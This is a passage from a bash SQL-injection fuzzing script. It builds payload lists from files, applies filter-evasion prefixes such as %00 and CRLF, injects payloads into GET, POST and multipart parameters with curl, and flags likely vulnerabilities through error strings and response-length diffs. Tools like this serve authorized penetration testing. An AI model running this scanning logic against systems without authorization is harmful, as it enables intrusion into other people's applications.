	cat ./payloads/all_attacks.txt | while read quack; do
		echo $quack >> payloads.txt
	done
fi

if [ true = "$r" ] ; then
	cat ./payloads/encodedquotepayloads.txt | while read quack; do
		echo $quack >> payloads.txt
	done
fi

#if [ true = "$Y" ] ; then 
#	cat ./payloads/xsspayloads.txt | while read quack; do
#		echo $quack >> payloads.txt
#	done
#fi

# this code scans through a custom payload list and replaces 'X' with the $timedelayduration value:
# this allows users to specifiy their own timedelay sqli payloads:
if [ true = "$C" ] ; then
	cat $custompayloadlist | while read quack; do
		echo $quack | replace "X" $timedelayduration >> payloads.txt
	done
fi

#flatten this down just in case theres an old version lying about:
rm nullpayloads.txt 2>/dev/null

# this code prepends each payload with a %00, sometimes useful for filter evasion:
if [ true = "$A" ] ; then
	cat payloads.txt | while read quack; do
		echo "%00"$quack >> nullpayloads.txt
	done
	cat nullpayloads.txt > payloads.txt
	rm nullpayloads.txt 2>/dev/null
fi

# this code prepends each payload with a %0d%0a, sometimes useful for filter evasion:
if [ true = "$B" ] ; then
	cat payloads.txt | while read quack; do
		echo "%0d%0a"$quack >> nullpayloads.txt
	done
	cat nullpayloads.txt > payloads.txt
	rm nullpayloads.txt 2>/dev/null
fi

totalpayloads=`wc -l payloads.txt | cut -d " " -f 1`
echo "Payload list created with $totalpayloads entries" 


#MANDATORY URL connection testing routine:
if [ false = "$G" ] ; then
#check to ensure a target has been defined:
	if [[ $uhostname == "" ]]
		then echo "Fatal: No target defined. Please specify a target using -t."
		exit
	fi
	#message in red
	echo "Attempting a test connection to $uhostname" 
	testresult=`curl $uhostname -v $curlproxy $httpssupport -H "$headertoset" -w %{http_code}:%{size_download}`
	testresultstatus=`echo $testresult | cut -d ":" -f 1`
	testresultlength=`echo $testresult | cut -d ":" -f 2`
	#echo "The status code was "$testresultstatus 
	echo ""
	echo "" 
	if [[ $testresultstatus == "000" ]]
		then echo "No data returned on connection: is the server up? Check your settings or set the -G flag to skip the connection check."
		exit
	else
		echo "Connection looks good."
	fi		
fi

#this IF statement creates list of params to skip based on a user-supplied list, or using the default list.
rm ./parameters_to_skip.txt 2>/dev/null
if [ true = "$S" ] ; then					
	cat $parameterstoskip | while read quack; do
		echo $quack >> parameters_to_skip.txt
	done
else 
	cat ./payloads/default_parameters_to_skip.txt | while read quack; do
		echo $quack >> parameters_to_skip.txt
	done
fi

#################scanner section#########################
K=0

mainrequester()
{
# beginning of main request function
# this section is written confusingly:
# first we do clean & evil GET requests
# then we do clean & evil POST requests
# but POST requests are split out three ways: normal POST, POST URI params, POST data params
# also, for POSTs, we only send one good request per URL instead of one per parameter

if [ true = "$Z" ] ; then echo "DEBUG! Entering REQUEST PHASE"; fi
sessionStorage=`cat ./session/$safelogname.$safehostname.sessionStorage.txt 2>/dev/null`
if [[ $method != "POST" ]]; then #we're doing a get - simples
	if [[ "$sessionStorage" = 0 ]] ; then
		#write set sessionStorage to 1 to prevent clean requests being sent for each param:
		sessionStorage=1
		echo $sessionStorage > ./session/$safelogname.$safehostname.sessionStorage.txt
		# send a 'normal' request
		and1eq1=`curl $i -o dump --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`
		if [ true = "$Z" ] ; then resp=`echo $and1eq1 | cut -d ":" -f 1`; time=`echo $and1eq1 | cut -d ":" -f 3`; echo "DEBUG! STATUS: $resp TIME: $time";fi
		echo $and1eq1 > ./session/$safelogname.$safehostname.and1eq1.txt
		echo "Testing URL $K of $entries $method $i"
	fi
	echo "$method URL: $K/$entries Param ("$((paramflag + 1 ))"/"$arraylength")": $paramtotest "Payload ("$payloadcounter"/"$totalpayloads"): $payload"
	#send an evil get requst
	and1eq2=`curl $r -o dumpfile --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`
	if [ true = "$Z" ] ; then echo "Request: $r";fi
	if [ true = "$Z" ] ; then resp=`echo $and1eq2 | cut -d ":" -f 1`; time=`echo $and1eq2 | cut -d ":" -f 3`; echo "DEBUG! STATUS: $resp TIME: $time";fi
	# right, thats it for clean and evil GET requests. now POSTs:
else	# we're doing a POST - not so simple...
	# we only need to send a clean request if we are doing time diffing and we havent already sent one for this URL
	# TODO move the below IF to the next level up:
	# it should encapsulate both clean GETs and clean POSTS, not just clean POSTS
	# NOTE the below IF never gets executed, EXCEPT when doing timedelay or command injection.
	# This is because length diff testing requests are sent by the EVIL send (the following IF)
	# which commences with the comment "send an 'evil' POST request"
	if [[ "$sessionStorage" == 0 && true = "$e" || true = "$b" ]] ; then
		# send a 'normal' POST request
		if (($firstPOSTURIURL>0)) ; then
			if [ $firstPOSTURIURL == 1 ] ; then #we want to fuzz the POSTURI params, NOT the data
				if [ $multipartPOSTURL != 1 ] ; then
					and1eq1=`curl -d "$static" $uhostname$page"?"$params -o dump --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`
				fi
				if [ true = "$Z" ] ; then echo "Request: $uhostname$page"?"$params"??"$static";fi
				if [ true = "$Z" ] ; then resp=`echo $and1eq1 | cut -d ":" -f 1`; time=`echo $and1eq1 | cut -d ":" -f 3`; echo "DEBUG! STATUS: $resp TIME: $time";fi
				#write set sessionStorage to 1 to prevent clean requests being sent for each param:
				sessionStorage=1
				echo $sessionStorage > ./session/$safelogname.$safehostname.sessionStorage.txt
				echo $and1eq1 > ./session/$safelogname.$safehostname.and1eq1.txt
				echo "Testing URL $K of $entries POST $uhostname$page?$params??$static" 	
			fi
			if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POST data params, NOT the POSTURI params
				and1eq1=`curl -d "$params" $uhostname$page -o dump --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`;
				if [ true = "$Z" ] ; then echo "Request: $uhostname$page"?"$params";fi
				if [ true = "$Z" ] ; then resp=`echo $and1eq1 | cut -d ":" -f 1`; time=`echo $and1eq1 | cut -d ":" -f 3`; echo "DEBUG! STATUS: $resp TIME: $time";fi
				sessionStorage=1
				echo $sessionStorage > ./session/$safelogname.$safehostname.sessionStorage.txt
				echo $and1eq1 > ./session/$safelogname.$safehostname.and1eq1.txt
				echo "Testing URL $K of $entries POST $uhostname$page??$params" 
			fi
		elif [ "$multipartPOSTURL" == 1 ] ; then #we are in the land of multipart forms. here be dragons
				mparam=`echo "--form $params" | replace "&" " --form " `
				and1eq2=`curl $uhostname$page $mparam -o dumpfile --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`
		else #just a normal POST:
			and1eq1=`curl -d "$params" $uhostname$page -o dump --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`
			if [ true = "$Z" ] ; then resp=`echo $and1eq1 | cut -d ":" -f 1`; time=`echo $and1eq1 | cut -d ":" -f 3`; echo "DEBUG! STATUS: $resp TIME: $time";fi
			#write set sessionStorage to 1 to prevent clean requests being sent for each param:
			sessionStorage=1
			echo $sessionStorage > ./session/$safelogname.$safehostname.sessionStorage.txt
			echo $and1eq1 > ./session/$safelogname.$safehostname.and1eq1.txt
			echo "Testing URL $K of $entries POST $uhostname$page?$params" 		
		fi	
	fi
	# send an 'evil' POST request
	if (($firstPOSTURIURL>0)) ; then
		if [ $firstPOSTURIURL == 1 ] ; then #we want to fuzz the POSTURI params, NOT the data
			and1eq2=`curl -d "$static" $uhostname$page"?"$output -o dumpfile --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`
			if [ true = "$Z" ] ; then resp=`echo $and1eq2 | cut -d ":" -f 1`; time=`echo $and1eq2 | cut -d ":" -f 3`; echo "DEBUG! STATUS: $resp TIME: $time";fi
			echo "$method URL: $K/$entries Param ("$((paramflag + 1 ))"/"$arraylength")": $paramtotest "Payload ("$payloadcounter"/"$totalpayloads"): $payload"	
		fi
		if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POST data params, NOT the POSTURI params
			and1eq2=`curl -d "$output" $uhostname$page -o dumpfile --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`
			if [ true = "$Z" ] ; then resp=`echo $and1eq2 | cut -d ":" -f 1`; time=`echo $and1eq2 | cut -d ":" -f 3`; echo "DEBUG! STATUS: $resp TIME: $time";fi
			echo "$method URL: $K/$entries Param ("$((paramflag + 1 ))"/"$arraylength")": $paramtotest "Payload ("$payloadcounter"/"$totalpayloads"): $payload"
		fi
	elif [ "$multipartPOSTURL" == 1 ] ; then #we are in multipart form mode
		#mparam=$(echo "--form \"$output\"" | replace "&" "\" --form \"")
		#printf -v str 'Hello World\n===========\n'
		echo -n "--form \""$output\" | replace '&' '" --form "' > ./foo.txt
		#TODO: re-implement the -H "$headertoset" option in the below:
		and1eq2="`eval curl $uhostname$page "\`cat ./foo.txt\`" -o dumpfile --cookie $cookie $curlproxy $httpssupport -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`"
		if [ true = "$Z" ] ; then resp=`echo $and1eq2 | cut -d ":" -f 1`; time=`echo $and1eq2 | cut -d ":" -f 3`; echo "DEBUG! STATUS: $resp TIME: $time";fi  
		echo "$method URL: $K/$entries Param ("$((paramflag + 1 ))"/"$arraylength")": $paramtotest "Payload ("$payloadcounter"/"$totalpayloads"): $payload"
	else #just a normal evil POST:
		echo "$method URL: $K/$entries Param ("$((paramflag + 1 ))"/"$arraylength")": $paramtotest "Payload ("$payloadcounter"/"$totalpayloads"): $payload"
		and1eq2=`curl -d "$output" $uhostname$page -o dumpfile --cookie $cookie $curlproxy $httpssupport -H "$headertoset" -w "%{http_code}:%{size_download}:%{time_total}:%{redirect_url}" 2>/dev/null`
		if [ true = "$Z" ] ; then resp=`echo $and1eq2 | cut -d ":" -f 1`; time=`echo $and1eq2 | cut -d ":" -f 3`; echo "DEBUG! STATUS: $resp TIME: $time";fi
	fi
fi
#end of request function

redirectlocation=`echo $and1eq2 | cut -d ":" -f 4,5,6,7,8,9,10`
}

####### scanning loop #############

#this line makes sure we have specified a payload type
if [[ true = "$n" || true = "$s" || true = "$e" || true = "$b" || true = "$q" || true = "$r" || true = "$C" ]] ; then

#message in red
echo -e '\E[31;48m'"\033[1mScan commenced\033[0m"
tput sgr0 # Reset attributes.

### new scanning engine ###
##BEGINING OF PER-URL LOOP:
firstPOSTURIURL=0
# the firstPOSTURIURL flag handles situations where POST requests have URI parmeters and has three states: 
# 0 no postURI params (this must be a GET or a normal POST)
# 1 postURI param detected, fuzz the postURI params, send the post data params as a static string
# 2 postURI param detected, fuzz the post data params, send the postURI params as a static string

firstrunflag=0	
vulnerable=0

echo "" > ./session/$safelogname.$safehostname.oldURL.txt
echo "" > ./session/$safelogname.$safehostname.oldparamlist.txt

cat cleanscannerinputlist.txt | while read i; do
	#default the multipartPOSTURL flag down to 0 - most requests are 'normal'
	multipartPOSTURL=0
	if [ true = "$Z" ] ; then echo "DEBUG! Starting outerloop iteration" ;fi
	methodical=`echo $i | cut -d " " -f 1`
	if [[ $i =~ $question$question && "$methodical" =~ "POST" && $i =~ !($question$question$question) ]] ; then
		#increment the firstPOSTURIURL flag: 
		firstPOSTURIURL=$((firstPOSTURIURL+1)) 
	fi
	#this is for multipart POST forms:
	if [[ $i =~ $question$question$question && "$methodical" =~ "POST" ]] ; then
		multipartPOSTURL=1 
		echo "INFO: Multipart form detected"
	fi

	if [ true = "$Z" ] ; then echo "DEBUG! firstPOSTURIURL: $firstPOSTURIURL" ; fi
	if [ true = "$Z" ] ; then echo "DEBUG! i: $i" ;fi
	K=$((K+1)); #this is a request counter
	continueflag=0
	alreadyscanned=0
	#had to store some loop params in text files as they kept getting cleared down
	#have to initialise these values at the start of the loop: 
	sessionStorage=0
	echo $sessionStorage > ./session/$safelogname.$safehostname.sessionStorage.txt
	and1eq1=0
	echo $and1eq1 > ./session/$safelogname.$safehostname.and1eq1.txt

	if [ true = "$L" ] ; then
		# session liveness check was requested
		checkpage=`curl $canaryRequest -o dump.txt --cookie $cookie $curlproxy $httpssupport -H "$headertoset"`
		cat dump.txt 2>/dev/null | egrep -o $canaryRequestSearchString > search.txt
		search=`cat search.txt`
		if [[ $search != "" ]]
			then echo "Session is valid"
		else	
			echo "Halting as session is invalid. Resume at request number "$K
			break
		fi
	fi
	# resume routine to allow users to resume a scan from a given request number
	if [ true = "$Q" ] ; then
		if (($K<$resumeline))
			then echo "Skipping request number "$K
			continue 3
		fi
	fi
	method=`echo $i | cut -d " " -f 1`
	
	#work out what the page value is. for a firstPOSTURIURL value of 2, set the page to be the page AND the postURI params
	#for everything else, the page is the page... 
	if [ $firstPOSTURIURL == 2 ] ; then 
		page=`echo $i | cut -d " " -f 2 | cut -d "?" -f 1,2`
	else
		page=`echo $i | cut -d " " -f 2 | cut -d "?" -f 1`
	fi

	#TODO: the below does not account for normal POST requests? investigate? 
	#this branch is for RESTful params	
	if [[ true == "$R" ]]; then
		if (($firstPOSTURIURL>0)) ; then
			if [ $firstPOSTURIURL == 1 ] ; then #we want to fuzz the POSTURI params, NOT the data
				params=`echo $i | cut -d " " -f 2 | cut -d "?" -f 2`
				static=`echo $i | cut -d " " -f 2 | cut -d "?" -f 4`
			fi
			if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POST data params, NOT the POSTURI params
				params=`echo $i | cut -d " " -f 2 | cut -d "?" -f 4`
				static=`echo $i | cut -d " " -f 2 | cut -d "?" -f 2`
			fi
		else #we are dealing with a simple GET request
			params=`echo $i | cut -d " " -f 2 | cut -d "?" -f 1 | cut -d "/" -f 2,3,4,5,6,7,8,9,10,11,12 | replace "/" "="`
		fi
		#echo "DEBUG $i"
		#echo "DEBUG $uhostname"
		#echo "debug i "$i;				
						
		stringofparams=`echo $params | tr "&" " "`		
	else # normal scan not RESTful #work out the params that will be fuzzed in this loop iteration:
		if [ true = "$Z" ] ; then echo "DEBUG! NOT RESTFUL PARAMS"; fi
		if (($firstPOSTURIURL>0)) ; then
			if [ $firstPOSTURIURL == 1 ] ; then #we want to fuzz the POSTURI params, NOT the data
				params=`echo $i | cut -d " " -f 2 | cut -d "?" -f 2`
				static=`echo $i | cut -d " " -f 2 | cut -d "?" -f 4`
			fi
			if [ $firstPOSTURIURL == 2 ] ; then #we want to fuzz the POST data params, NOT the POSTURI params
				params=`echo $i | cut -d " " -f 2 | cut -d "?" -f 4`
				static=`echo $i | cut -d " " -f 2 | cut -d "?" -f 2`
			fi
		elif [ $multipartPOSTURL == 1 ] ; then #multipart post request:
			params=`echo $i | cut -d " " -f 2 | cut -d "?" -f 4`
		else #we are dealing with a simple GET request
			params=`echo $i | cut -d " " -f 2 | cut -d "?" -f 2`
		fi
		
		#echo "debug static "$i;				
		#echo "debug params "$params;				
		stringofparams=`echo $params | tr "&" " "`
		
		#echo `echo $stringofparams` >> ./session/$safelogname.$safehostname.siteanalysis.txt	
	fi	
	if [ true = "$Z" ] ; then echo "DEBUG! params: "$params; fi
	if [ true = "$Z" ] && [ $firstPOSTURIURL != "0" ] ; then echo "DEBUG! static: "$static; fi
	if [ true = "$Z" ] ; then echo "DEBUG! stringofparams: $stringofparams" ;fi
	
	#code that compares the current URL and params for comparison against the old URL - this can be used to skip params already scanned
	#newURL=`echo $i | cut -d "?" -f 1| cut -d " " -f2`
	newURL=`echo $i | cut -d "?" -f 1`
	newParams=$stringofparams
	oldURL=`cat ./session/$safelogname.$safehostname.oldURL.txt`
	#oldParams=`cat ./session/$safelogname.$safehostname.oldParams.txt`

	#if the current and last urls dont match, clear down the lists
	#we want these lists to grow across a given URL, but re-start
	#when a new URL comes along
	if [[ true != "$F" ]]; then # ...unless F (override param skipping) is set:
		if [[ "$oldURL" == "$newURL" ]] ; then
			if [[ "$firstrunflag" == 0 || "$K" == "$entries" ]] ; then
				echo "------------------" >> ./session/$safelogname.$safehostname.siteanalysis.txt
				echo "$newURL" >> ./session/$safelogname.$safehostname.siteanalysis.txt
				for dfg in $stringofparams; do
					echo `echo $dfg | cut -d "=" -f1` >> ./session/$safelogname.$safehostname.siteanalysis.txt
				done
				firstrunflag=1
				#this branch is taken for the first and last URLs, otherwise these wouldent be captured in the siteanalysis log
			fi
		else
			if [[ "$firstrunflag" == 0 || "$K" == "$entries" ]] ; then
				echo "------------------" >> ./session/$safelogname.$safehostname.siteanalysis.txt
				echo "$newURL" >> ./session/$safelogname.$safehostname.siteanalysis.txt
				for dfg in $stringofparams; do
					echo `echo $dfg | cut -d "=" -f1` >> ./session/$safelogname.$safehostname.siteanalysis.txt
				done
				firstrunflag=1
				#this branch is taken for the first and last URLs, otherwise these wouldent be captured in the siteanalysis log
			else
				#this branch is taken when a new URL comes along
				#the below writes out the old URL and paramlist info to the siteanalysis log
				
				echo "------------------" >> ./session/$safelogname.$safehostname.siteanalysis.txt
				echo "$oldURL" >> ./session/$safelogname.$safehostname.siteanalysis.txt
				cat ./session/$safelogname.$safehostname.oldparamlist.txt >> ./session/$safelogname.$safehostname.siteanalysis.txt
				#the below clears away the old paramlist
				echo "" > ./session/$safelogname.$safehostname.oldparamlist.txt
			fi
		fi
	fi
	paramsarray=($stringofparams)
	if [ true = "$Z" ] ; then echo "DEBUG! paramsarray: "${paramsarray[*]}; fi
	output='';
	arraylength=${#paramsarray[*]}
	((arraylengthminusone=$arraylength-1))
	#echo "debug arraylengthminusone " $arraylengthminusone
	#this flag will track which param we are fuzzing (lets initialise it down to 0): 	
	paramflag=0
	##BEGINING OF PER-PARAMETER LOOP
	for paramstring in ${paramsarray[*]}; do
		#echo "DEBUG-perparam! sessionStorage=$sessionStorage"	
		#this line is where we include the payload path string:
		#here we are going to feed in our newly compiled payload list:
		((payloadcounter=0))		
		##BEGINING OF PER-PAYLOAD LOOP
		cat payloads.txt | while read payload; do
			#echo "DEBUG-perpayload! sessionStorage=$sessionStorage"	
			#payloadcounter is not used for logic, it just presents the user with the payload number			
			payloadcounter=$((payloadcounter+1))
			if [ true = "$Z" ] ; then echo "debug payload counter: $payloadcounter" ;fi 
			# the output buffer will hold the final string of params including the injected param and the normal ones
			# lets clear it down at the begining of the loop:
			output=''
			# for each parameter in a given URL we need to create a request where one of the parameters has 
			# a payload injected but all the others are 'normal'. A normal request like this:
			# http://www.foobar.com/foo.aspx?a=1&b=2&c=3
			# ... should be fuzzed like this:
			# http://www.foobar.com/foo.aspx?a=PAYLOAD&b=2&c=3
			# http://www.foobar.com/foo.aspx?a=1&b=PAYLOAD&c=3
			# http://www.foobar.com/foo.aspx?a=1&b=2&c=PAYLOAD
			# so, we need an inner loop that will, for each parameter in the URL
			# create a request with one injected parameter.
			# we will use the paramflag variable to determine which param is to be injected.
			# y will be the innerloop iterator. where y=paramflag, we will inject our payload.
			# note that while y increments for each loop iteration, paramflag does not 
			for (( y = 0; y <= $arraylengthminusone; y += 1 )); do
				if [ true = "$Z" ] ; then echo "DEBUG! payload: "$payload;fi	
				if [ true = "$Z" ] ; then echo "DEBUG! y: $y" ; fi
				if [ true = "$Z" ] ; then echo "DEBUG! paramflag: $paramflag"; fi
				if (( $y == $paramflag )) ; then 
					#payload=$payload
					if [ true = "$O" ] ; then #uri unicode encoding
						if [ true = "$Z" ] ; then echo "DEBUG! encoder input: $payload";fi
						decodedpayload=$payload						
						uriinputencode=$payload
					  	uriunicode
					  	payload=$uriinputencoded
						if [ true = "$Z" ] ; then echo "DEBUG! encoder input: $payload";fi
					fi

					#inject the payload into this parameter:
					#(the -R path is for REST params:)
					if [[ true != "$R" ]]; then
						if [ "$multipartPOSTURL" == 1 ] ; then #mulipart form: wrap payload in double quotes
							output=$output`echo ${paramsarray[$y]} | cut -d "=" -f1`"="$payload
						else # normal request:
							output=$output`echo ${paramsarray[$y]} | cut -d "=" -f1`"="$payload
						fi
					else					
						output=$output$payload
					fi

					if [ true = "$Z" ] ; then echo "DEBUG! output after payload injection: $output";fi
					if [ true = "$Z" ] ; then echo "DEBUG! paramsarray at y: " ${paramsarray[$y]};fi
					paramtotest=`echo ${paramsarray[$y]} | cut -d "=" -f1`
					if [ true = "$Z" ] ; then echo "DEBUG! paramtotest: "$paramtotest;fi
					#check to see if the current parameter should be skipped:
					for paramcheck in `cat parameters_to_skip.txt`; do
						if [[ "$paramcheck" == "$paramtotest" ]]; then
							continueflag=1
							break
						fi
					done
					#this code looks to see if we've already scanned this parameter of this URI:
					#if we have, the param gets skipped
					if [[ "$oldURL" == "$newURL" ]] ; then
						if [ true = "$Z" ] ; then echo "DEBUG! URL MATCH Detected!" ; fi
						for paramcheckold in `cat ./session/$safelogname.$safehostname.oldparamlist.txt`; do
							#paramcheckold=`echo $paramcheck2| cut -d "=" -f 1`
							if [ true = "$Z" ] ; then echo "DEBUG! checking if param matches $paramcheckold"; fi
							continueflag=0
							if [[ "$paramcheckold" == "$paramtotest" ]]; then
								continueflag=1
								alreadyscanned=1
								if [ true = "$Z" ] ; then echo "DEBUG! Skipping: $paramtotest as it has already been fuzzed for page $page" ; fi
								echo -n "."
								break
							fi
						done
						if (( $continueflag == 1 )); then
							break
						fi
					fi					
				else 	
					#we are not injecting this parameter, so print it out as normal:
					output=$output${paramsarray[$y]}
				fi
				#this line works out if we need to append an & to the parameter value:
				if [[ true != "$R" ]]; then
					if (($y == $arraylengthminusone)) ; then 
						foobar="foobar"
						#no need to add a '&' suffix to $output as no more params left to add...
					else 
						output=$output"&"
					fi 
				else	
					if (($y == $arraylengthminusone)) ; then 
						foobar="foobar"
						#no need to add a '&' suffix to $output as no more params left to add...
					else 
						output=$output"/"
					fi 
				fi
				#if we are testing the last parameter, we have a full list of params ready to go to the scanner:				
				if (($y == $arraylengthminusone))
					###IMPORTANT: this instruction MUST BE HERE!!!:
					then asd=1

					cleanoutput=$output
					
					if [ true = "$O" ] ; then #uri unicode encoding
						if [ true = "$Z" ] ; then echo "DEBUG! payload: $payload";fi
						cleanoutput=`echo $output | replace "$payload" "$decodedpayload" `
						if [ true = "$Z" ] ; then echo "DEBUG! cleanoutput: $cleanoutput";fi
					fi

					if [ $multipartPOSTURL == 0 ] ; then #as long as this isnt a multipartPOST request...
						#encode output and params variables without changing the variable name:
						encodeinput=$params
						encodeme
						params=$encodeoutput

						encodeinput=$output
						encodeme
						output=$encodeoutput
	
						encodeinput=$static
						encodeme
						static=$encodeoutput
					fi

					#create two requests - one clean, one evil
					if [[ true != "$R" ]]; then
						r=$uhostname$page"?"$output
						i=$uhostname$page"?"$params
					else
						r=$uhostname"/"$output
						i=$uhostname"/"$params
					fi
					if [ true = "$Z" ] ; then echo "Output: $output";fi
					if (( $continueflag == 1 )); then
						if (( $alreadyscanned == 1 )); then
							alreadyscanned=0
							if [[ true != "$F" ]]; then
								continueflag=0
								continue
							fi
						else
							echo "Skipping param $paramtotest as it's on the don't scan list"
							continueflag=0
							continue
						fi
					fi
					# end of request preparation section
					# beginning of request section

					if [ true = "$O" ] ; then #uri unicode encoding
						if [ true = "$Z" ] ; then echo "DEBUG! encoder input: $inputbuffer";fi
						uriinputdecode=$payload
					  	uriunicode
					  	payload=$uriinputdecoded
						if [ true = "$Z" ] ; then echo "DEBUG! encoder input: $inputbuffer";fi
					fi
					
					#this calls the mainrequester function
					mainrequester

					#beginning of response parsing section
                                        if [ true = "$Z" ] ; then echo "DEBUG! Entering response analysis phase";fi
 
					#check the response code and alert the user if its not 200:					
					reponseStatusCode=`echo $and1eq2 | cut -d ":" -f 1`;
					if [[ "$reponseStatusCode" != "200" && "$reponseStatusCode" != "404" ]]
						then echo "ALERT: Status code "$reponseStatusCode" response";
						if [[ "$reponseStatusCode" == "302" ]] ; then
							echo "ALERT: Destination location: $redirectlocation"
						fi
					fi 
					
					#check the response and alert the user if the response was empty (i.e. no content, just headers)
					filechecklines=`wc ./dumpfile 2>/dev/null` 
 					if [[ "$filechecklines" != "" ]] ; then
						if [ true = "$Z" ] ; then echo "Alert: Data in response" ; fi
					else
						echo "Alert: Empty response. Status code: $reponseStatusCode" 
					fi
					# xss testing subsection
					# this is mothballed for now
					#if [ true = "$Y" ] ; then
					#	cat ./dumpfile | grep -i -o "$payload" > search.txt;
					#	search=`cat search.txt`;
					#	if [[ $search != "" ]] ; then
					#		if [[ $method != "POST" ]] ; then  #we're doing a get - simples
					#			echo "[XSS: $paramtotest] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt;
					#			echo "[XSS: $paramtotest] $method URL: $uhostname$page"?"$output";
					#		else
					#			if (($firstPOSTURIURL>0)) ; then
					#				if [ $firstPOSTURIURL == 1 ] ; then
					#					echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"?"$static"??"$output" >> ./output/$safelogname$safefilename.txt;
					#					echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"?"$static"??"$output"
					#				else
					#					echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"??"$output" >> ./output/$safelogname$safefilename.txt;
					#					echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"??"$output"
					#				fi
					#			else
									#normal post
					#				echo "[XSS: $paramtotest REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt;
					#				echo -e '\E[31;48m'"\033[1m[XSS: $paramtotest REQ:$K]\033[0m $method URL: $uhostname$page"?"$output";
					#				tput sgr0 # Reset attributes.
					#			fi
					#		fi							
					#	fi
					#fi
					#end of xss section

					#this subsection scans responses for common error strings:	
					cat ./payloads/errors-two-words.txt | while read z; do 
						cat ./dumpfile 2>/dev/null | egrep -i -o $z > search.txt;
						search=`cat search.txt`;
						if [[ $search != "" ]] ; then 
							if [[ $method != "POST" ]]; then #we're doing a get - simples
								echo "[ERROR: $z REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt;
								echo -e '\E[31;48m'"\033[1m[ERROR: $z REQ:$K]\033[0m $method URL: $uhostname$page"?"$output";
								tput sgr0 # Reset attributes.
							else
								if (($firstPOSTURIURL>0)) ; then
									if [ $firstPOSTURIURL == 1 ] ; then
										echo "[ERROR: $z REQ:$K] $method URL: $uhostname$page"?"$static"??"$output" >> ./output/$safelogname$safefilename.txt
										echo -e '\E[31;48m'"\033[1m[ERROR: $z REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$output"
										tput sgr0 # Reset attributes.
									else
										echo "[ERROR: $z REQ:$K] $method URL: $uhostname$page"??"$output" >> ./output/$safelogname$safefilename.txt
										echo -e '\E[31;48m'"\033[1m[ERROR: $z REQ:$K]\033[0m $method URL: $uhostname$page"??"$output"
										tput sgr0 # Reset attributes.
									fi
								elif [ "$multipartPOSTURL" == 1 ] ; then
									echo "[ERROR: $z REQ:$K] $method URL: $uhostname$page"???"$output" >> ./output/$safelogname$safefilename.txt
									echo -e '\E[31;48m'"\033[1m[ERROR: $z REQ:$K]\033[0m $method URL: $uhostname$page"???"$output";
									tput sgr0 # Reset attributes.
								else
									#normal post
									echo "[ERROR: $z REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt
									echo -e '\E[31;48m'"\033[1m[ERROR: $z REQ:$K]\033[0m $method URL: $uhostname$page"?"$output";
									tput sgr0 # Reset attributes.
								fi
							fi		
						fi
					done
					#end of subsection that scans for common error strings									
					#beginning of response lenth diffing section
					
					#this is IMPORTANT!!
					#if you want to perform length diffing (i.e. -sn)
					#you need to include 345 or dfth in the always false payload and 456 or fghi in the always true payload.
					#also, order by diffing should be 9999 vs 1
					if [[ "$payload" =~ "345" || "$payload" =~ "dfth" || "$payload" =~ "1" ]]
						then SQLequallength=`echo $and1eq2 | cut -d ":" -f 2`
					fi

					if [[ "$payload" =~ "456" || "$payload" =~ "fghi" || "$payload" =~ "9999" ]]
						then SQLunequallength=`echo $and1eq2 | cut -d ":" -f 2`
					fi

					if [[ "$SQLequallength" != "" && "$SQLunequallength" != "" ]]
						then ((answer=$SQLequallength-$SQLunequallength))
						SQLequallength=""
						SQLunequallength=""
						# the payload is an or 1=1: if its not longer, its not worked
						if [ $answer -gt 4 ] ; then
							#set the vulnerable flag and sploit that mutha
							vulnerable=1
							#this line writes out the difference between the responses from the 'clean' and 'evil' requests: 
							diff ./dump ./dumpfile --suppress-common-lines > ./responsediffs/$safefilename-resdiff-$K-$payloadcounter-$reqcount.txt
							if [[ $method != "POST" ]]; then #we're doing a get - simples 
								echo "[LENGTH-DIFF: $answer REQ:$K $safefilename-resdiff-$K-$payloadcounter-$reqcount.txt] $method URL: $uhostname$page"?"$output" >> ./output/$safelogname$safefilename.txt
								echo -e '\E[31;48m'"\033[1m[LENGTH-DIFF: $answer REQ:$K]\033[0m $method URL: $uhostname$page"?"$output" ;
								tput sgr0 # Reset attributes.
							else
								if (($firstPOSTURIURL>0)) ; then
									if [ $firstPOSTURIURL == 1 ] ; then
										echo "[LENGTH-DIFF: $answer REQ:$K $safefilename-resdiff-$K-$payloadcounter-$reqcount.txt ] $method URL: $uhostname$page"?"$static"??"$output" >> ./output/$safelogname$safefilename.txt
										echo -e '\E[31;48m'"\033[1m[LENGTH-DIFF: $answer REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$output";
										tput sgr0 # Reset attributes.
									else
										echo "[LENGTH-DIFF: $answer REQ:$K $safefilename-resdiff-$K-$payloadcounter-$reqcount.txt] $method URL: $uhostname$page"??"$output" >> ./output/$safelogname$safefilename.txt
